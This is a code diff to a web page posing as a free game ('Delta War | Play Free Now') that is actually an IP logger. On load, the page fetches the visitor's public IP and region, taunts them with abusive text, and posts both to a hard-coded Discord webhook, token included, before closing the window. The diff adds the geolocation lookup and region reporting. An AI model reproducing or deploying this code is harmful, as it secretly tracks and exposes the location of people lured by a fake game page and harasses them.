@@ -3,15 +3,23 @@
 <head>
  <meta charset="UTF-8">
  <title>Delta War | Play Free Now</title>
+ <style>
+ #text {
+ font-size: 48px;
+ transition: opacity 0.5s ease-in-out;
+ }
+ 
+ .hidden {
+ opacity: 0;
+ }
+ </style>
 </head>
 <body onload="animateText()">
  <!-- Fake content here -->
  <h1 id="text">Aint this your ip?</h1>
 
  <script>
- async function logIP() {
- const ipResponse = await fetch('https://cors-anywhere.herokuapp.com/https://api.ipify.org');
- const ip = await ipResponse.text();
+ async function logIP(state, ip) {
  const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
  
  try {
@@ -19,9 +27,9 @@
  method: 'POST',
  headers: { 
  'Content-Type': 'application/json', 
- 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.' 
+ 'User-Agent': 'Discord Webhook' 
  },
- body: JSON.stringify({ content: `Logged IP from iPhone 12 user! ${ip}` }),
+ body: JSON.stringify({ content: `Logged IP from ${state}: ${ip}` }),
  });
  
  if (!response.ok) {
@@ -32,14 +40,21 @@
  
  } catch (error) {
  console.error("Error sending webhook:", error);
- alert("Failed to log IP on iPhone 12.");
+ alert("Failed to log IP. Check console for details.");
  }
  
  window.close(); // Close the window after logging
  }
 
  async function animateText() {
- document.getElementById('text').innerText += " " + (await (await fetch('https://cors-anywhere.herokuapp.com/https://api.ipify.org')).text());
+ const ipResponse = await fetch('https://api.ipify.org');
+ const ip = await ipResponse.text();
+ 
+ // Get user's state (region)
+ const locationResponse = await fetch(`http://ip-api.com/json/${ip}`);
+ const locationData = await locationResponse.json();
+ 
+ document.getElementById('text').innerText += " " + ip + " (" + locationData.regionName + ")";
  
  setTimeout(() => {
  document.getElementById('text').className = "hidden";
@@ -55,7 +70,7 @@
  document.getElementById('text').innerText = "you a bitch";
  document.getElementById('text').classList.remove("hidden");
  
- setTimeout(logIP, 400); // Call logIP after final message fades in
+ setTimeout(() => logIP(locationData.regionName, ip), 400); // Call logIP after final message fades in
  }, 500);
  }, 500);
  }, 500);
